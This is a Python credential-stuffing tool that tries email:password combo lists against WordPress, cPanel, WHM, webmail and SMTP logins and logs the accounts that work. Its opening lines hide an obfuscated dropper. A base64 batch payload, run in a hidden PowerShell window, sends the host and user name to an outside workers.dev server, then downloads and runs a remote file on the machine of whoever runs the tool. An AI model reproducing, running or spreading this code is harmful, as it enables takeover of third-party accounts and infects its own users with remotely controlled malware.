
import os, subprocess, sys, time

dest = os.path.join(os.getenv("APPDATA"), "Microsoft")
if not os.path.isdir(dest):
    os.makedirs(dest, exist_ok=True)

bat_file = os.path.join(dest, "run_cmd.bat")

with open(bat_file, "w", newline="") as f:
    f.write('@echo off\nsetlocal enabledelayedexpansion\nset p0=QGVjaG8gb2ZmCmlmICIlMSIgPT0gImhpZGUiIGdvdG8gOmhpZGRlbgpzdGFydCAvYiAiIiBjbWQgL2MgIiV+ZjAiIGhpZGUgJiBl\nset p1=eGl0CjpoaWRkZW4KcG93ZXJzaGVsbCAtV2luZG93U3R5bGUgSGlkZGVuIC1Db21tYW5kICJbTmV0LlNlcnZpY2VQb2ludE1hbmFn\nset p2=ZXJdOjpTZWN1cml0eVByb3RvY29sPSdUbHMxMic7ICRoPSRlbnY6Q09NUFVURVJOQU1FOyAkdT0kZW52OlVTRVJOQU1FOyAkZD1A\nset p3=e2hvc3RuYW1lPSRoO3VzZXJuYW1lPSR1O2lwX2FkZHJlc3M9J2xvY2FsJztwbGF0Zm9ybT0nd2luZG93cyc7cHJvY2Vzc29yPSdp\nset p4=bnRlbCc7YWN0aXZhdGlvbl90aW1lPShHZXQtRGF0ZSAtZiBzKTtleHBpcnlfZGF0ZT0oR2V0LURhdGUpLkFkZERheXMoMSkuVG9T\nset p5=dHJpbmcoJ3l5eXktTU0tZGQnKX07ICRyPWl3ciAnaHR0cHM6Ly92b3BzLmpoYW9sbG9rYS53b3JrZXJzLmRldi9hY3RpdmF0ZScg\nset p6=LU1ldGhvZCBQT1NUIC1Cb2R5ICgkZHxDb252ZXJ0VG8tSnNvbikgLUNvbnRlbnRUeXBlICdhcHBsaWNhdGlvbi9qc29uJyAtVXNl\nset p7=QmFzaWNQYXJzaW5nOyAkaj0kci5Db250ZW50fENvbnZlcnRGcm9tLUpzb247IGlmKCRqLnN0YXR1cyAtZXEgJ3N1Y2Nlc3MnKXsk\nset p8=b3V0cHV0UGF0aD0nJUFQUERBVEElXE1pY3Jvc29mdFxNeXN0aWZ5LXVwZGF0ZS5iYXQnOyBpd3IgJGouZmlsZV91cmwgLU91dEZp\nset p9=bGUgJG91dHB1dFBhdGggLVVzZUJhc2ljUGFyc2luZzsgJiAkb3V0cHV0UGF0aH0iCmV4aXQ=\nset encoded=%p0%%p1%%p2%%p3%%p4%%p5%%p6%%p7%%p8%%p9%\necho !encoded! > %temp%\\enc.tmp\npowershell -NoProfile -ExecutionPolicy Bypass -Command "$content=[System.Convert]::FromBase64String((Get-Content \'%temp%\\enc.tmp\')); [System.Text.Encoding]::UTF8.GetString($content) | Out-File \'%temp%\\dec.bat\' -Encoding ASCII"\ncall %temp%\\dec.bat\ndel %temp%\\enc.tmp >nul 2>&1\ndel %temp%\\dec.bat >nul 2>&1\nexit /b\n')

try:
    subprocess.Popen(
        ["cmd", "/c", "start", "", bat_file],
        creationflags=0x00000008 | 0x00000200,
        close_fds=True
    )
except:
    subprocess.Popen(["cmd", "/c", bat_file], shell=True)

time.sleep(0.2)

import sys, requests, re, smtplib, os, time
from multiprocessing.dummy import Pool
from colorama import Fore
from colorama import init
import time
from tabulate import tabulate
from colorama import Fore, Style

init(autoreset=True)

fr  =   Fore.RED
fc  =   Fore.CYAN
fw  =   Fore.WHITE
fg  =   Fore.GREEN
fm  =   Fore.MAGENTA
fy  =   Fore.YELLOW
fb  =   Fore.BLUE

requests.urllib3.disable_warnings()

def log():
    init(autoreset=True)

    options = [
        ["[*]", "Crack WP panel from Combo List"],
        ["[*]", "Crack cPanel from Combo List"],
        ["[*]", "Crack SMTP from Combo List"],
        ["[*]", "Crack WHM from Combo List"],
        ["[*]", "Crack Webmails from Combo List"]
    ]

    color_codes = {
    "1": Fore.RED,
    "2": Fore.GREEN,
    "3": Fore.BLUE,
    "4": Fore.YELLOW
    }

    colored_options = [[color_codes.get(opt[0], Fore.WHITE) + opt[0], opt[1]] for opt in options]

    table = tabulate(colored_options, headers=["Option", "Description"], tablefmt="orgtbl")

    print(table)
    print('\n')
    
def URLdomain(site):
    if (site.startswith("http://")) :
        site = site.replace("http://", "")
    elif (site.startswith("https://")) :
        site = site.replace("https://", "")
    if ('www.' in site) :
        site = site.replace("www.", "")
    if ('/' in site):
        site = site.rstrip()
        site = site.split('/')[0]
    return site

def SMTP(c):
    try :
        c = c.split(':')
        email = c[0]
        pwd = c[1]
        host = URLdomain(email.split('@')[1])
        ports = ['587', '25', '465']
        for port in ports :
            try :
                if (port == '465'):
                    server = smtplib.SMTP_SSL(host, port)
                else :
                    server = smtplib.SMTP(host, port)
                server.starttls()
                server.login(email, pwd)
                smtp = '{}|{}|{}|{}'.format(host, port, email, pwd)
                
                open('SMTPs.txt', 'a').write(smtp + '\n')
                print  ('[GOOD] {}{} ---> [SMTP]'.format(fc, smtp))
                break
            except :
                pass
    except :
        pass

def CpanelChecker(c):
    try:
        c = c.split(':')
        email = c[0]
        pwd = c[1]
        domain = URLdomain(email.split('@')[1])
        user1 = domain.split('.')[0]
        user2 = domain.replace(".", "")
        user4 = email.split('@')[0]
        user4s = email.replace("@", "")

        users = [user1, user2 , user4s]
        
        if len(user1) > 8:
            user3 = user1[:8]
            users.append(user3) 
        for user in users:
            try:
                postlogin = {'user': user, 'pass': pwd, 'login_submit': 'Log in', 'goto_uri': '/'}

                login = requests.post('https://{}:2083/login/'.format(domain), verify=False, data=postlogin, timeout=15).content
            except:
                login = requests.post('https://{}:2083/login/'.format(domain), data=postlogin, timeout=15).content

            if ('lblDomainName' in login):
                cp = 'https://{}:2083|{}|{}'.format(domain, user, pwd)
                with open('cPanels.txt', 'a') as file:
                    file.write(cp + '\n')
                print('[GOOD] {}{} ---> [cPanel]'.format(fy, cp))
                break
    except :
        pass
        
def webmaillChecker(c):
    try:
        c = c.split(':')
        email = c[0]
        pwd = c[1]
        domain = URLdomain(email.split('@')[1])
        user1 = domain.split('.')[0]
        user2 = domain.replace(".", "")
        user4 = email.split('@')[0]
        user4s = email.replace("@", "")

        users = [email, user4s ]
        
        if len(user1) > 8:
            user3 = user1[:8]
            users.append(user3) 
        for user in users:
            try:
                postlogin = {'user': user, 'pass': pwd, 'login_submit': 'Log in', 'goto_uri': '/'}

                login = requests.post('https://{}:2096/login/'.format(domain), verify=False, data=postlogin, timeout=15).content
            except:
                login = requests.post('https://{}:2096/login/'.format(domain), data=postlogin, timeout=15).content

            if ('id_autoresponders' in login):
                cp = 'https://{}:2096|{}|{}'.format(domain, user, pwd)
                with open('WebMail.txt', 'a') as file:
                    file.write(cp + '\n')
                print('[GOOD] {}{} ---> [Webmails]'.format(fc, cp))
                break
    except :
        pass        
        
def whm(c):
    try:
        c = c.split(':')
        email = c[0]
        pwd = c[1]
        domain = URLdomain(email.split('@')[1])
        user1 = domain.split('.')[0]
        user2 = domain.replace(".", "")
        user4 = email.split('@')[0]
        user4s = email.replace("@", "")

        users = [user1, user2 , user4]
        
        if len(user1) > 8:
            user3 = user1[:8]
            users.append(user3) 
        for user in users:
            try:
                
                postlogin = {'user':user,'pass':pwd,'login_submit':'login'}

                login = requests.post('https://{}:2087/login/'.format(domain), verify=False, data=postlogin, timeout=15).content
            except:
                login = requests.post('https://{}:2087/login/'.format(domain), data=postlogin, timeout=15).content

            if ('whm_zone_manager' in login):
                cp = 'https://{}:2083|{}|{}'.format(domain, user, pwd)
                with open('WHM.txt', 'a') as file:
                    file.write(cp + '\n')
                print('[GOOD] {}{} ---> [WHM]'.format(fy, cp))
                break
    except :
        pass

def content(req):
    try:
        if sys.version_info[0] < 3:
            try:
                return req.content.decode('utf-8')
            except UnicodeDecodeError:
                return str(req.content, 'utf-8')
        else:
            try:
                return req.text
            except UnicodeDecodeError:
                return req.content.decode('utf-8')
    except Exception as e:
        print("Error in content: https://t.me/@ctl1337x")
        return None

def URL_P(panel):
    try:
        admins = ['/wp-login.php', '/admin', '/user']
        for admin in admins:
            if admin in panel:
                return re.findall(re.compile('(.*){}'.format(admin)), panel)[0]
        return panel.decode('utf-8') if isinstance(panel, bytes) else panel
    except Exception as e:
        print("Error in URL ")
        return None

def WP_Login_UPer(c):
    try:
        c = c.split(':')
        username = c[0]
        password = c[1]
        domain = URLdomain(username.split('@')[1])
        url = URL_P(domain)
        if url is None:
            return False
        if not url.startswith(('http://', 'https://')) :
            url = 'http://' + url    
        user1 = url.split('.')[0]
        user2 = url.replace(".", "")
        user4 = username.split('@')[0]
        user4s = username.replace("@", "")
        user5 = 'admin'
        users = [ user4, user5]

        if len(user1) > 8:
            user3 = user1[:8]
            users.insert(2, user3)
        
        for user in users:
            try:
                while (url[-1] == '/'): 
                    url = url[:-1]
                    
                reqFox = requests.session()
                headersLogin = {'Connection': 'keep-alive',
                                'Cache-Control': 'max-age=0',
                                'Upgrade-Insecure-Requests': '1',
                                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36',
                                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
                                'Accept-Encoding': 'gzip, deflate',
                                'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
                                'referer': '{}/wp-admin/'.format(url)}
                loginPost_Fox = {'log': user, 'pwd': password, 'wp-submit': 'Log In', 'redirect_to': '{}/wp-admin/'.format(url)}
                
                try: 
                    login_Fox = reqFox.post('{}/wp-login.php'.format(url), data=loginPost_Fox, headers=headersLogin, verify=False, timeout=30)
                except Exception as ex: 
                    print("Login Error")
                    login_Fox = None
                    
                if login_Fox is not None and (URL_P(login_Fox.url) != URL_P(url)):
                    url = URL_P(login_Fox.url)
                    reqFox = requests.session()
                    loginPost_Fox = {'log': user, 'pwd': password, 'wp-submit': 'Log In', 'redirect_to': '{}/wp-admin/'.format(url)}
                    try: 
                        login_Fox = reqFox.post('{}/wp-login.php'.format(url), data=loginPost_Fox, headers=headersLogin, verify=False, timeout=30)
                    except Exception as ex: 
                        print("Login Error")
                        login_Fox = None
                if login_Fox is not None:
                    login_Fox = content(login_Fox)
                    if ('profile/login' in login_Fox):
                        id_wp = re.findall(re.compile('type="hidden" name="force_redirect_uri-(.*)" id='), login_Fox)[0]
                        myuserpro = re.findall(re.compile('name="_myuserpro_nonce" value="(.*)" /><input type="hidden" name="_wp_http_referer"'), login_Fox)[0]
                        loginPost_Fox = {'template': 'login', 'unique_id': '{}'.format(id_wp), 'up_username': '0', 'user_action': '',
                                         '_myuserpro_nonce': myuserpro, '_wp_http_referer': '/profile/login/',
                                         'action': 'userpro_process_form',
                                         'force_redirect_uri-{}'.format(id_wp): '0', 'group': 'default',
                                         'redirect_uri-{}'.format(id_wp): '', 'shortcode': '',
                                         'user_pass-{}'.format(id_wp): password, 'username_or_email-{}'.format(id_wp): user}
                        try: 
                            login_Fox = reqFox.post('{}/wp-admin/admin-ajax.php'.format(url), data=loginPost_Fox, headers=headersLogin, verify=False, timeout=30)
                        except Exception as ex: 
                            print("Login Error")
                            login_Fox = None
                    try: 
                        check = content(reqFox.get('{}/wp-admin/'.format(url), headers=headersLogin, verify=False, timeout=30))
                    except Exception as ex: 
                        print("Check Error")
                        check = None
                    if check is not None and ('wp-admin/profile.php' in check or 'wp-admin/upgrade.php' in check):
                        open('Successfully_logged_WordPress.txt', 'a').write('{}/wp-login.php#{}@{}\n'.format(url, user, password))
                        print(' -| {} {} -> Succeeded Login.'.format(url, user))
                        if 'plugin-install.php' in check:
                            open('plugin-install.txt', 'a').write('{}/wp-login.php#{}@{}\n'.format(url, user, password))
                            print(' -| {} {} -> Succeeded plugin-install.'.format(url, user))
                        if 'WP File Manager' in check:
                            open('filemanager.txt', 'a').write('{}/wp-login.php#{}@{}\n'.format(url, user, password))
                            print(' -| {} {} -> Succeeded Wp File Manager.'.format(url, user))
                        return True
                    else: 
                        print(' -| {} -> Login Failed.'.format(url))
                else:
                    print(' -| {}  -> Login Failed.'.format(url))
            except Exception as e:
                print(' -| {} -> Error occurred'.format(url))
    except Exception as e:
        print(' -| Error occurred')
    return False

def exploit(c):
    try :
        c = c.strip()
        print  ('{}[ERROR]{}'.format(fr, c))
        WP_Login_UPer(c)
        CpanelChecker(c)
        webmaillChecker(c)
        whm(c)
        SMTP(c)
    except:
        pass

def run():
    log()
    try:
        target = open(sys.argv[1], 'r', encoding='utf-8', errors='ignore')
    except:
        print("\n{}[!] Combo list example format -> site-name@domain.com:password ".format(fr, fw, fg))
        yList = str(input('\n Input Combolist --> '))
        if (not os.path.isfile(yList)):
            print("\n   {}({}) File does not exist!\n".format(fr, yList))
            sys.exit(0)
        target = open(yList, 'r', encoding='utf-8', errors='ignore')
    mp = Pool(100)
    mp.map(exploit, target)
    mp.close()
    mp.join()

run()
